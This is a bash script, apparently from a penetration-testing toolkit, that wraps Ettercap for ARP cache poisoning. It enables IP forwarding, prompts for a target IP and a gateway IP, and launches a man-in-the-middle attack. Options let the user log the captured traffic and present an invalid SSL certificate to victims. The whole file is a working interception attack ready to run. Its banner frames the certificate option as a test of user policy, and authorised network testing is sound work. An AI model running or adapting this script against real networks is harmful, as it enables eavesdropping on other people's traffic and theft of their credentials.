#!/bin/bash
# Ettercap ARP cache poison script

include_monitor=0
. /opt/pwnix/pwnpad-scripts/px_interface_selector.sh

f_banner(){
  clear
  echo "Ettercap-NG 0.8.0 ARP Cache Poison Tool"
  echo
  echo "[!] Use on networks you are connected to!"
  echo
  echo "[!] DO NOT USE WITH EVILAP - IT WON'T WORK!"
  echo
}

f_one_or_two(){
  read -p "Choice [1-2]: " input
  case $input in
    [1-2]*) echo $input ;;
    *)
      f_one_or_two
      ;;
  esac
}

f_sslfake(){
  clear
  echo
  echo "Would you like to use the Invalid SSL Cert option?"
  echo
  echo "Good for testing user policy to make sure users aren't accepting bad certs!"
  echo
  echo "NOTE: if using SSLstrip with Ettercap this is unnecessary"
  echo
  echo "1. Yes"
  echo "2. No "
  echo
  sslfakecert=$(f_one_or_two)
}

f_logging(){
  clear
  echo
  echo "Would you like to log data?"
  echo
  echo "Captures saved to /opt/pwnix/captures/ettercap/"
  echo
  echo "1. Yes"
  echo "2. No "
  echo

  logchoice=$(f_one_or_two)
}

f_generate_filename(){
  echo "/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)"
}

f_run(){
  echo 1 > /proc/sys/net/ipv4/ip_forward

  filename=$(f_generate_filename)

  clear
  echo
  read -p "Enter target IP to ARP cache poison: " target1
  echo

  clear
  echo
  read -p "Enter target IP of gateway/router: " gw
  echo

  if [ $logchoice -eq 1 ]; then
    if [ $sslfakecert -eq 1 ]; then
      ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/
    else
      ettercap -i $interface -T -S -q -l $filename -M arp:remote /$gw/ /$target1/
    fi
  else
    if [ $sslfakecert -eq 1 ]; then
      ettercap -i $interface -T -q -M arp:remote /$gw/ /$target1/
    else
      ettercap -i $interface -T -S -q -M arp:remote /$gw/ /$target1/
    fi
  fi
}

f_banner
f_interface
f_sslfake
f_logging
f_run
